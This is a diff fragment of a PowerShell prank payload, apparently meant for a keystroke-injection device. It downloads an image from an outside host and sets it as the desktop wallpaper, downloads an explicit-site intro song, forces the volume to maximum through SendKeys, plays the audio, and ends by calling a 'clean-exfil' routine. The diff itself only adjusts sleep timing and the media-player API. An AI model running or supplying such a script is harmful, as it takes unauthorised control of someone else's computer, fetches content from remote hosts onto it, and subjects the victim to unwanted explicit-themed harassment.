@@ -137,11 +137,10 @@ $WebClient = New-Object System.Net.WebClient
  
 $WebClient.DownloadFile("https://img.hebus.com/tmp/hebus_2560x1440_1692890222_4305.jpg","$Env:USERPROFILE\Pictures\$ImageName.jpg")
 
+Start-Sleep -s 2
+
 Set-WallPaper -Image "$Env:USERPROFILE\Pictures\$ImageName.jpg" -Style Center
 
-
-
-Start-Sleep -s 3
 
 
 
@@ -149,18 +148,20 @@ Start-Sleep -s 3
 
 $WebClient.DownloadFile("https://www.cjoint.com/doc/22_04/LDlpTsHovwB_Pornhub-intro-song.mp3","$Env:USERPROFILE\Music\$MusicName.mp3")
 
+Start-Sleep -s 2
+
+
 # Sets Volume to max level
 
 $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
 
 # Play pornhub intro
 
-Add-Type -AssemblyName presentationCore
-$mediaPlayer = New-Object system.windows.media.mediaplayer
-$mediaPlayer.open("$Env:USERPROFILE\Music\$MusicName.mp3")
-$mediaPlayer.Play()
+$MediaPlayer = [Windows.Media.Playback.MediaPlayer, Windows.Media, ContentType = WindowsRuntime]::New()
+$MediaPlayer.Source = [Windows.Media.Core.MediaSource]::CreateFromUri("$Env:USERPROFILE\Music\$MusicName.mp3")
+$MediaPlayer.Play()
 
-
+Start-Sleep -s 10
 
 clean-exfil
  
